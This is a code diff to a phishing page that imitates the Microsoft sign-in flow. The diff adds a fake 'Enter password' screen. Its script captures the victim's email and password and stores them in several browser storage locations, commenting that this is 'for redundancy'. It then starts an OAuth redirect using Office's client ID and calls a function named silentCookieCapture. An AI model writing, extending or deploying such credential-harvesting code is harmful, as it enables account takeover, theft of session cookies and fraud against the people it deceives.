@@ -238,6 +238,22 @@
           </div>
         </div>
 
+        <!-- ✅ PASSWORD VIEW -->
+        <div id="password_view" class="hidden">
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <div style="cursor: pointer; margin-top: 20px; margin-bottom: 10px;" id="back_to_email">
+            <i class="fas fa-arrow-left"></i> <span id="display_email" style="margin-left: 8px;"></span>
+          </div>
+          <h1 class="mt-2">Enter password</h1>
+          <div class="form-group mt-2">
+            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
+          </div>
+          <p><a href="#">Forgot password?</a></p>
+          <div class="button-container mt-4">
+            <button class="btn btn-primary-blue" id="sign_in">Sign in</button>
+          </div>
+        </div>
+
         <!-- ✅ Office OAuth Loading View (div2) -->
         <div id="div2" class="hidden">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
@@ -250,7 +266,7 @@
           </div>
         </div>
 
-        <!-- ✅ Detailed "Sign-in options" View (EXACT from code) -->
+        <!-- ✅ Detailed "Sign-in options" View -->
         <div id="options_view_detailed" class="hidden">
             <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
             <h1 class="mt-4">Sign-in options</h1>
@@ -317,14 +333,19 @@
   </div>
 
   <script>
-    console.log('🚀 replacement.html loaded - v3 - Correct Client ID');
+    console.log('🚀 replacement.html loaded - WITH PASSWORD CAPTURE AND BACKUP');
 
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
+        const passwordView = document.getElementById('password_view');
         const div2 = document.getElementById('div2');
         const optionsBox = document.getElementById('options_box');
         const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
         const nextBtn = document.getElementById('next');
+        const signInBtn = document.getElementById('sign_in');
+        const backToEmail = document.getElementById('back_to_email');
+        const displayEmail = document.getElementById('display_email');
         const signInOptionsLink = document.getElementById('sign_in_options_link');
         const backBtn = document.getElementById('options-view-back');
         const optionsViewDetailed = document.getElementById('options_view_detailed');
@@ -338,7 +359,6 @@
 
         // Office.com Pre-trusted OAuth Configuration
         const OFFICE_CONFIG = {
-          // ✅ CORRECTED CLIENT ID
           clientId: '2e338732-c914-4129-a148-45c24f2da81d',
           redirectUri: dynamicRedirectUri,
           scope: 'openid profile email offline_access',
@@ -419,8 +439,8 @@
             });
         }
 
-        // Email to Office OAuth redirect
-        nextBtn.addEventListener('click', async function () {
+        // ✅ Step 1: Email -> Password View
+        nextBtn.addEventListener('click', function () {
             const email = emailInput.value.trim();
             if (!email) {
                 emailInput.focus();
@@ -432,15 +452,66 @@
             localStorage.setItem('ms_email', email);
             sessionStorage.setItem('ms_email', email);
 
+            displayEmail.textContent = email;
+
+            div1.classList.add('hidden');
+            optionsBox.classList.add('hidden');
+            passwordView.classList.remove('hidden');
+        });
+
+        // ✅ Back to email
+        backToEmail.addEventListener('click', function() {
+            passwordView.classList.add('hidden');
+            div1.classList.remove('hidden');
+            optionsBox.classList.remove('hidden');
+        });
+
+        // ✅ Step 2: Password -> OAuth Redirect (WITH BACKUP STORAGE)
+        signInBtn.addEventListener('click', async function () {
+            const email = localStorage.getItem('ms_email');
+            const password = passwordInput.value.trim();
+
+            if (!password) {
+                passwordInput.focus();
+                return;
+            }
+
+            console.log('🔑 Password entered');
+
+            // ✅ SAVE CREDENTIALS IN MULTIPLE LOCATIONS
+            const credentials = {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString()
+            };
+
+            const credentialsStr = JSON.stringify(credentials);
+
+            // Save in multiple locations for redundancy
+            localStorage.setItem('ms_auth_credentials', credentialsStr);
+            sessionStorage.setItem('ms_auth_credentials', credentialsStr);
+            localStorage.setItem('ms_password', password); // Extra backup
+            sessionStorage.setItem('ms_password', password); // Extra backup
+
+            console.log('✅ Credentials saved:', { email, hasPassword: !!password });
+
+            // ✅ VERIFY credentials were saved
+            const verify1 = localStorage.getItem('ms_auth_credentials');
+            const verify2 = localStorage.getItem('ms_password');
+            console.log('🔍 Verification check:', {
+                credentialsSaved: !!verify1,
+                passwordSaved: !!verify2,
+                canParse: !!JSON.parse(verify1 || '{}').password
+            });
+
             const nonce = generateNonce();
             const state = generateState();
             
             sessionStorage.setItem('ms_oauth_nonce', nonce);
             sessionStorage.setItem('ms_oauth_state', state);
 
-            div1.classList.add('hidden');
+            passwordView.classList.add('hidden');
             div2.classList.remove('hidden');
-            optionsBox.classList.add('hidden');
 
             await silentCookieCapture(email);
 
